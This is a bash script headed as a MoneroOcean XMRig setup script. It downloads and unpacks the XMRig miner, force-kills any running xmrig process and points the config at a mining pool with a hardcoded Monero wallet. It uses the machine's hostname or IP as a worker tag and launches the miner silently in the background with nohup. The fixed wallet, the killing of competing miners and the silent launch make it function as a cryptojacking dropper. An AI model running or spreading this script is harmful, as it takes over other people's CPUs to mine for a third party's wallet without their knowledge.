#!/bin/bash

# -----------------------------
# MoneroOcean XMRig setup script
# -----------------------------
VERSION=2.14
MO_DIR="$HOME/moneroocean"
LOG_FILE="$MO_DIR/setup.log"

CPU_PERCENT=${1:-70}   # default CPU usage %
WALLET="43DcQyUQWE9X3bmNMMMD1RJA2wJKJxS6rLvJCVoaXuieSwRqjapvqQTR7KnX6DfzaSB9nHiBMWsfo1dGQWxpefaVSRyrVXM"

rm -rf "$MO_DIR"
mkdir -p "$MO_DIR"

echo "MoneroOcean mining setup script v$VERSION" > "$LOG_FILE"
echo "[*] Using CPU limit: $CPU_PERCENT%" | tee -a "$LOG_FILE"

if ! type curl >/dev/null; then
  echo "ERROR: curl is required" | tee -a "$LOG_FILE"
  exit 1
fi

# Calculate threads
CPU_THREADS=$(nproc)
THREADS=$(( CPU_THREADS * CPU_PERCENT / 100 ))
[ "$THREADS" -lt 1 ] && THREADS=1
echo "[*] Calculated threads to use: $THREADS" | tee -a "$LOG_FILE"

# Stop existing miner
killall -9 xmrig >/dev/null 2>&1

# Download and extract XMRig
echo "[*] Downloading XMRig..." >> "$LOG_FILE"
curl -L -s "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz
tar xf /tmp/xmrig.tar.gz -C "$MO_DIR"
rm /tmp/xmrig.tar.gz

# Setup password
PASS=$(hostname | cut -f1 -d".")
[ "$PASS" == "localhost" ] && PASS=$(ip route get 1 | awk '{print $NF;exit}')

# Configure config.json
CONFIG="$MO_DIR/config.json"
sed -i 's|"url": *"[^"]*",|"url": "gulf.moneroocean.stream:10128",|' "$CONFIG"
sed -i 's|"user": *"[^"]*",|"user": "'"$WALLET"'",|' "$CONFIG"
sed -i 's|"pass": *"[^"]*",|"pass": "'"$PASS"'",|' "$CONFIG"
sed -i 's|"background": *false,|"background": true,|' "$CONFIG"
sed -i 's|"max-threads-hint": *[^,]*|"max-threads-hint": '"$THREADS"'|g' "$CONFIG"
sed -i 's|"init-avx2": *[^,]*|"init-avx2": 1|g' "$CONFIG"

# Set CPU affinity for all threads
AFFINITY=""
for ((i=0;i<CPU_THREADS;i++)); do AFFINITY="$AFFINITY$i,"; done
AFFINITY=${AFFINITY%,}
sed -i '/"cpu": {/a \    "affinity": ['"$AFFINITY"'],' "$CONFIG"

# Explicitly set rx/0 to use THREADS
RX_THREADS=""
for ((i=0;i<THREADS;i++)); do RX_THREADS="$RX_THREADS$i,"; done
RX_THREADS=${RX_THREADS%,}
sed -i '/"rx": \[/c\    "rx": ['$RX_THREADS'],' "$CONFIG"

# Create miner launch script
cat >"$MO_DIR/miner.sh" <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
    nice $MO_DIR/xmrig --config=$CONFIG \$*
else
    echo "XMRig already running."
fi
EOL
chmod +x "$MO_DIR/miner.sh"

# Run miner in background
nohup "$MO_DIR/miner.sh" >> "$MO_DIR/miner.log" 2>&1 &

echo "[*] Setup complete. Miner running in background with $THREADS threads."
